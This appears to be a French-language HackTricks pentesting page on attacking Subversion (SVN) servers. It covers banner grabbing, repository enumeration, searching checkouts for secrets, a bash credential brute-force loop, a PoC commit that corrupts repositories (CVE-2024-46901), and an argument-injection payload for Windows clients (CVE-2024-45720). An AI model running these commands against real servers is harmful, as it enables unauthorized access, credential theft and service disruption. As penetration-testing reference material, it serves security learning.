# 3690/tcp - Pentesting Subversion (SVN) Serveur

{{#include ../banners/hacktricks-training.md}}

## Informations de base

**Subversion (SVN)** est un **système de contrôle de version** centralisé (licence Apache) utilisé pour la gestion des versions et le contrôle des révisions des logiciels.

**Port par défaut :** `3690/tcp` (svnserve). Il peut aussi être exposé via **HTTP/HTTPS** par `mod_dav_svn` et via **svn+ssh**.
```text
PORT     STATE SERVICE
3690/tcp open  svnserve Subversion
```
### Banner Grabbing
```bash
nc -vn 10.10.10.10 3690
svnserve --version           # if shell access is obtained
svn --version                # client version leak via error messages
```
## Énumération
```bash
# Anonymous / authenticated listing
svn ls svn://10.10.10.203                  # list root
svn ls -R svn://10.10.10.203/repo         # recursive list
svn info svn://10.10.10.203/repo          # repo metadata
svn log svn://10.10.10.203/repo           # commit history
svn checkout svn://10.10.10.203/repo      # checkout repository
svn up -r 2                               # move working copy to revision 2
svn diff -r 1:HEAD svn://10.10.10.203/repo   # view changes

# If served over HTTP(S)
svn ls https://10.10.10.10/svn/repo --username guest --password ''

# Extract revision props (often contain build creds, URLs, tokens)
svn propget --revprop -r HEAD svn:log svn://10.10.10.203/repo
```
### Recherche d'authentification et de configurations incorrectes

- `svnserve.conf` peut autoriser `anon-access = read` (ou même `write`). Si vous pouvez lister, essayez `checkout` pour extraire des secrets, scripts, jetons CI.
- Les dépôts stockent fréquemment **build pipelines**, **deployment keys**, et **database credentials** dans des fichiers de configuration versionnés. Cherchez dans la copie de travail après `checkout` : `grep -R "password\|secret\|token" -n .`.
- Si svn+ssh est activé, les shells des utilisateurs permettent souvent des commandes `svnserve` restreintes ; essayez `ssh user@host svnserve -t` avec des sous-commandes spécialement conçues pour contourner les wrappers.

### Bruteforcing credentials (svnserve)

`sasl` authentication (si activée) et de simples fichiers de mots de passe ne sont protégés que par le transport ; aucun verrouillage par défaut. Une boucle Bash rapide peut tester des credentials :
```bash
for u in admin dev ci; do
for p in $(cat /tmp/passlist); do
svn ls --username "$u" --password "$p" svn://10.10.10.203/repo 2>/dev/null && echo "[+] $u:$p" && break
done
done
```
## Vulnérabilités récentes (impact pratique)

### mod_dav_svn DoS via caractères de contrôle (CVE-2024-46901)

- Un utilisateur avec des droits de commit peut écrire un chemin contenant des caractères de contrôle (p.ex. `\x01`, `\x7f`) qui **corrompt le dépôt**, provoquant l'échec des checkouts/logs ultérieurs et pouvant potentiellement faire planter les workers `mod_dav_svn`.
- Affecte Subversion ≤ **1.14.4** lorsqu'il est servi via **HTTP(S)** (`mod_dav_svn`). Corrigé dans **1.14.5**.
- PoC commit avec `svnmucc` (requires valid commit creds):
```bash
# create payload file
printf 'pwn' > /tmp/payload
# commit a path with a control character in its name
svnmucc -m "DoS" put /tmp/payload $'http://10.10.10.10/svn/repo/trunk/bad\x01path.txt'
```
- Après le commit, les clients normaux peuvent planter ou refuser les mises à jour tant que les admins n'ont pas supprimé manuellement la révision avec `svnadmin dump/filter/load`.

### Windows argument injection in svn client (CVE-2024-45720)

- Sur Windows, l'encodage de caractères "best-fit" dans `svn.exe` permet une **command-line argument injection** lors du traitement de chemins/URLs spécialement conçus contenant des caractères non‑ASCII, pouvant conduire à l'exécution arbitraire de programmes.
- Affecte Subversion ≤ **1.14.3** uniquement sur Windows ; corrigé dans **1.14.4**. Attack surface: phishing d'un développeur pour exécuter `svn` sur une URL/chemin contrôlé par l'attaquant.
- Pentest angle: si vous contrôlez un partage réseau ou un ZIP fourni à un dev Windows, nommez une repo URL ou un chemin de working-copy contenant des octets best-fit qui se décodent en arguments injectés du type `" & calc.exe & "`, puis trompez la victime pour qu'elle exécute `svn status` ou similaire sur ce chemin.

## Notes for Exploitation Workflow

1. **Vérifier la méthode d'accès**: `svn://` (svnserve), `http(s)://.../svn/` (mod_dav_svn), or `svn+ssh://`.
2. Essayez d'abord la lecture anonyme ; puis spray des identifiants courants. Si HTTP Basic est utilisé, réutilisez des identifiants trouvés ailleurs.
3. Énumérez les hooks : les scripts `hooks/pre-commit`, `post-commit` contiennent parfois des identifiants en clair ou des noms d'hôtes.
4. Exploitez `svn:externals` pour récupérer des chemins supplémentaires depuis d'autres hôtes ; listez-les avec `svn propget svn:externals -R .` après checkout.
5. Version leaks: les en-têtes de réponse HTTP de `mod_dav_svn` montrent généralement la version de Subversion & Apache ; comparez avec 1.14.5 pour repérer les cibles vulnérables.
6. Si vous obtenez un accès au système de fichiers du repo, `svnadmin dump`/`svnlook author`/`svnlook dirs-changed` permettent une analyse hors ligne sans identifiants.



## References

- [Apache Subversion security advisory CVE-2024-46901](https://subversion.apache.org/security/CVE-2024-46901-advisory.txt)
- [Apache Subversion security advisory CVE-2024-45720](https://subversion.apache.org/security/CVE-2024-45720-advisory.txt)
{{#include ../banners/hacktricks-training.md}}
